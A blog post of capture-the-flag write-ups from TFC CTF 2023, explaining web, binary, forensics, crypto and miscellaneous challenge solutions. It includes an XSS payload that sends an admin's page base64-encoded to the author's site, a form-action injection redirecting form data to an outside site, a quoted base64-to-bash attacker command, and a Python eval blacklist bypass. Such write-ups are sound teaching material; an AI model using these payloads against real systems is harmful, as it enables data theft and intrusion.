---
title: "TFC CTF 2023"
date: 2023-08-20T00:00:00+00:00
# weight: 1
# aliases: ["/first"]
tags: ["tfcctf", "ctf", "binary", "crypto", "web", "tfcctf2023"]
author: "AlBovo"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Some writeups of the TFC CTF 2023 edition."
canonicalURL: "https://albovo.tech/en/ctf/"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups" # image path/url
    alt: "TFC CTF 2023" # alt text
    caption: "Some writeups of the TFC CTF 2023 edition." # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/AlBovo/AlBovo.github.io/blob/main/content/en"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

# TFC-CTF-2023
![tfc ctf logo](/images/tfc.png)

# Web
## Baby Ducky Notes
This challenge looked like a normal notes sharing site, but after a quick view to the source code, it was easy to find the way to read the flag.
In fact the `database.db` file had a query to initialize the notes table with this code: <br>
```py
query(con, f''' 
INSERT INTO posts (
    user_id,
    title,
    content,
    hidden
    ) VALUES (
        1,
        'Here is a ducky flag!',
        '{os.environ.get("FLAG")}',
        0  
);
''')
```
This could only means that the flag wasn't hidden and the easiest way to find it was to make a GET request to the url `http://challs.tfcctf.com:port/posts/view/admin` and the flag was in fact right there.

## Baby Ducky Notes: Revenge
Now the challenge was a bit more difficult than the previous one because the flag was hidden and the only way to read it was to make the admin read it for me or by stealing the admin's cookie which was HttpOnly.<br>
After looking for a while in the source code, I found a line from the template of the posts page:<br>
```html
<ul class="posts_ul">
    {% for post in posts %}
    <li>
        <div class="blog_post">
            <div class="container_copy">
                <h1> {{post.get('title')}} </h1>
                <h3> {{post.get('username')}} </h3>
                <p> {{post.get('content') | safe}} </p>
            </div>
        </div>
    </li>
    {% endfor %} 
</ul>
```
The content was rendered without any sanitizing and because of that I could perform an XSS using this payload<br>
```js
<script>
async function attack(){
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "/posts/view/admin", true);
    xhr.responseType = "text";
    xhr.onload = () => {
        window.location.href = "{input('Enter the url of your site: ')}?html=" + btoa(xhr.responseText.toString());
    };
    await xhr.send(null);
}
attack();
</script>
```
After executing this code the admin could read its notes (including the flag) and send the whole html code encrypted in base64 to my website where I had to decrypt it to find the flag.

## Cookie Store
I really hated this challenge for a while because I couldn't run the javascript code of the page (which was quite important) because of an error of the `setHTML` javascript function which only worked when the site was running as `localhost` or with an `https` connection. I later found out a way to run docker as `localhost` (it initially used the local ip 172.17.x.x) but even if I spent a lot of time to resolve this problem, the challenge was quite interesting, in fact this site printed our 'notes' using some columns sorting method that was vulnerable.
```js
const urlParams = new URLSearchParams(window.location.search);
const fields = urlParams.get('fields');

let form_html = '';
let fields_list = [];
if (fields) {
    fields_list = fields.split(',');
    fields_list.forEach(element => {
        form_html += `<div class="mb-4">
            <label for="${element}" ... >${element}</label>
            <input type="text" name="${element}" id="${element}" ...>
        </div>`;
    });
}
// This will sanitize the input
document.querySelector('#form_builder').setHTML(form_html);

...
```
This code in fact injects the input wihout any check in the html source code, then it removes any javascript script or method like `onerror` or `onload` before writing it in the page.<br>
This code is vulnerable because if I send this payload as a field
```html
"><input type="submit" formaction="our site" id="pwned"><label name="
```
I can redirect the form data from the cookie store to my site and then read the flag that the admin wrote in the title field.

## MCTree
This challenge was really easy but, I was tired (just a lot of skill issue) and I couldn't understand the vulnerability during the CTF (sorry ZenHack) but anyway, the challenge didn't have any source code to download. In fact it was only a site where you could register, login and, if after the login you had the admin username, you could achive the flag.
After a few attempts I saw that the challenge always removed any character like `{}<>[]'"` so the payload was to send a username like `{admin` so that the site could accept our request because the username was different from `admin` and after a sanitizing our username was `admin` anyway. And that's it lol :).

# Binary
## Diary
This challenge was really nice and easy because it had RWX segments in it, no PIE and also hadn't any canary.
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```
It had an important funciton `vuln` which only read 1024 chars in a 256 bytes long buffer, where I could perform an overflow to change the return pointer to another address
```c
fgets((char *)&local_108,0x400,stdin);
``` 
After using `ropgadgets` to find a useful code, I found a nice instruction
```nasm
call rax
```
so the only thing that I had to do was to make a shellcode using the `shellcraft` module of pwntools to create a shellcode and then call it by changing the return pointer to the shellcode address.

## Shello-World
This challenge is exactly the same of `Diary`, but in this one there is no buffer overflow to perform, because now the `vuln` function is the following
```C
fgets((char *)&local_108,0x100,stdin);
printf("Hello, ");
printf((char *)&local_108);
putchar(10); // (chr)(10) == '\n' => true
```
This is pretty different from diary but still vulnerable as there's a format string vulnerability because the source file calls a `printf` without set any format string which means that we can use the `fmtstr_payload` function from pwntools to write a payload which replaces the address of the function `exit` from the GOT with the address of the `win` function that will open a shell on the remote machine.

## Random
If you give a quick look at this challenge it doesn't seem to be really vulnerable, but if you look at the call of the `sran` function in the decompiled section of your tool, you can easily see something that looks like this
```c
srand(time(NULL));
```
which can be easily reproduced in python by using the `ctypes` library.<br>
So the exploit was to reproduce all the numbers generated by the seeded random function of the source file using a python script and than send them to the container to recive the flag.

# Forensics
## List
This challenge provided a file with a lot of http comunications always with the status code `404` or `403` when the client tries to get some 'random' directories.<br>
This is obviusly a bruteforce of the URIs directories that was performed using a tool like `gobuster` or `dirsearch`.<br>
Once I noticed this, I filtered all the responses by removing all those which had the status code `404` or `403`. This showed me some packets that looked like a response to a reverse shell command.
```sh
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
This could only mean that somewhere in the file there was a command executed by the attacker.
In fact after a while I found out that there were a lot of packets that were HTTP POST requests, all with the same length (756 bytes) and with the same paylaod.
```sh
echo "ZmluZCAvaG9tZS9jdGYgLXR5cGUgZiAtbmFtZSAifSIgMj4vZGV2L251bGw=" | base64 -d | bash
```
This is in fact a bash command encoded in base64 and this is what I got after I decoded it
```sh
find /home/ctf -type f -name "T" 2>/dev/null
```
and later I did the same on the next packet where I got the same payload with a little change
```sh
find /home/ctf -type f -name "F" 2>/dev/null
```
So the flag was just splitted in many different commands and the only thing left to do was to write a script to get by using a regex filter.

## Some Traffic
This challenge required much more time than the previous one because it also had some normal http packets that were just requests and responses of the upload of three images to a website.
After I've extracted all the images I tried to see what could be hidden in all the files, but I didn't find anything suspicious. However, the first image had three columns of green pixels that seemed to be a type of hidden data.
```py
(1, 84, 1)
(1, 70, 1)
(1, 67, 1)
(1, 67, 1)
(1, 84, 1)
(1, 70, 1)
(1, 123, 1)
```
This was the result when I tried to extract the RGB values of each pixel of each colum: the Red value was always 1 and it was the same for the Blue value, but the Green one seemed to be an ASCII value. As a matter of fact they were just the format of the flag `TFCCTF{` hidden in the pixels.

## MCTeenX
This challenge was really interesting because it provided a zip file protected by a password that I couldn't bruteforce using a dictionary attack.
It only had one file zipped in it that was a `.sh` file that normally has as first line like this 
```sh
#!/bin/sh
```
Since I knew part of the file text I could try a Plaintext Attack using `bkcrack` by executing this command
```sh
bkcrack -C src.zip -c script.sh -p temp_file.sh
```
(the `temp_file.sh` file was just the known plaintext).<br><br>
Luckily this tool could extract the `script.sh` file that seemed to be just an echo of an encoded base64 text piped in the file `red.png`.<br>
The first thing that popped up into my head was to analyze it using `zsteg` which found different things, but the most suspicious one was an hexadecimal text which, if decoded, appeared to be random bytes.<br>
`030a111418142c783b39380d397c0d25293324231c66220d367d3c23133c6713343e343b3931`<br>
After a few tries I attempted to xor it with the flag format `TFCCTF{` which gave me back a string like this `WLRWLRW`.<br>
I then repetead this string until I filled the whole length of the hex string and I xored it again to see what I could get. Even if the first try went wrong because I mistyped the string, the following one decrypted the flag.

# Cryptography
## Dizzy
Dizzy was the first challenge of the cyrpto section and it had this output
```
T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24
```
after thinking what this could mean, I saw that a few pairs were somehow suspicious<br>
`T0 F1 C2 C3 T4 F5 {6`<br>
Later I understood that all the pairs where just `char:position` randomly mixed, and after I've written a quick script (just look the `normal_solution` function in the solve script) I found the whole flag.

## Mayday
Like the previous one, this challenge had this output<br>
```
Whiskey Hotel Four Tango Dash Alpha Romeo Three Dash Yankee Oscar Uniform Dash Sierra One November Kilo India November Golf Dash Four Bravo Zero Uniform Seven
```
which was just the NATO alphabet and the solution was just to map every word to a character (or number) to find the flag.<br>
P.S. The flag was in the format `TFCCTF{FOUND_TEXT}`

## Alien Music
This challenge was just pure guessing, but the solution was the easiest one in the crypto section, it had this output<br>
```
DC# C#D# C#C C#C DC# C#D# E2 C#5 CA EC# CC DE CA EB EC# D#F EF# D6 D#4 CC EC EC CC# D#E CC E4
```
After analyzing it for a while, I tried to connect the first pairs to the format `TFCCTF{` and I tought that the connection could be:<br>
```py
ord('T') => 0x54 => {'D' : 5, 'C#' : 4}
ord('F') => 0x46 => {'C#' : 4, 'D#' : 6}
ord('C') => 0x43 => {'C#' : 4, 'C' : 3}
```
I tried to map all the pairs in this python dictionary : 
```py
d = {
    "A": "0", "A#" : "1", "B" : "2", "C" : "3",  "C#" : "4", 
    "D": "5", "D#" : "6", "E" : "7", "F" : "8", "F#" : "9", 
    "1": "a", "2" : "b", "3" : "c", "4" : "d", "5" : "e", "6" : "f"
}
```
and after that I wrote a quick script, I found the whole flag.

## Rabid
Rabid had a 'little' hint in the text which said that they wrote a little 'extra' information in the message, in fact the output ...<br>
```
VEZDQ1RGe13kwdV9yNGIxZF9kMGc/IT8hPyE/IT8hPi8+Pz4/PjEyMzkwamNhcHNrZGowOTFyYW5kb21sZXR0ZXJzYW5kbnVtYmVyc3JlZWVlMmozfQ==
```
was a base64 encoded message with an encoded prefix that was the format `TFCCTF{` and the only way to find the remaining flag was just to remove from the base64 message the encoded message `TFCCTF{` and decode it again.

## AES CTF Tool V1
To solve this challenge the easiest way was to install the [tool](https://github.com/hofill/AES-CTF-Tool) that the admins wrote just for that challenge and execute the `main.py` file.<br>
```
alan@ubuntu:~$ python3 main.py
[INFO] Starting initial cryptanalysis.
[INFO] Starting initial cryptanalysis.
[INFO] Determining block size.
[X] Found block size: 16.
[INFO] Determining block chiper category.
[X] Found block cipher category: ECB_CBC.
[INFO] Starting fingerprinting.
[INFO] Determining block cipher mode.
[X] Found block cipher mode: ECB.
======= Probabilities =======
ECB: 100%
CBC: 0%
CFB: 0%
OFB: 0%
CTR: 0%
=============================
[INFO] ECB/CBC detected. Determining padding method.
[X] Found padding method: Block.
[INFO] Fingerprinting complete.
Would you like to perform a Chosen Plaintext Attack? (Y/n) Y
Y

Optimize search space for printable ascii? (Y/n) Y
Y

[INFO] Starting Chosen Plaintext Attack.
Offset: 8 bytes
Block number: 7
Found: T
Found: TF
Found: TFC
Found: TFCC
Found: TFCCT
Found: TFCCTF
Found: TFCCTF{
...
```

## AES CTF Tool V2
This challenge was exactly like the previous one but the tool also required to pass it an encrypted chipertext to decrypt.<br>
```
alan@ubuntu:~$ python3 main.py
[INFO] Starting initial cryptanalysis.
[INFO] Starting initial cryptanalysis.
[INFO] Determining block size.
[X] Found block size: 16.
[INFO] Determining block chiper category.
[X] Found block cipher category: ECB_CBC.
[INFO] Starting fingerprinting.
[INFO] Determining block cipher mode.
[X] Found block cipher mode: CBC.
======= Probabilities =======
CBC: 100%
ECB: 0%
CFB: 0%
OFB: 0%
CTR: 0%
=============================
[INFO] ECB/CBC detected. Determining padding method.
[X] Found padding method: Block+.
[INFO] Checking if the IV is reused for each encryption.
[INFO] Reuses IV: True.
[INFO] Fingerprinting complete.
Would you like to perform a Padding Oracle Attack? (Y/n) Y
Y

[INFO] Starting Padding Oracle Attack.
Enter the ciphertext to decrypt (in hexadecimal): 4a1e62c51fd9e5f79919...
Found byte: 84
Intermediate value: 85
Found byte: 247
Intermediate value: 245
Found byte: 214
Intermediate value: 213
Found byte: 159
Intermediate value: 155
...
```

# Miscellaneous
## Discord Shenanigans V3
This challenge was just pure trolling because the flag was in the discord bot logo of the ctf server.

## My First Calculator
I actually didn't solved this challenge during the CTF because I didn't know the existence of this exploit that I'm going to explain (credits dp_1).<br>
Python is just a 'misterious' programming language that has some strange vulnerabilities where it comes to strings.
This challenge provided a python file like this
```py
import sys
print("This is a calculator")
inp = input("Formula: ")
sys.stdin.close()
blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ."

if any(x in inp for x in blacklist):
    print("Nice try")
    exit()

fns = {
    "pow": pow
}
print(eval(inp, fns, fns))

```
The exploit consisted in sending a payload written in italic that just could bypass the blacklist and than could read the flag doing something like this 
```py
''.join(i for i in open("flag", "r"))
```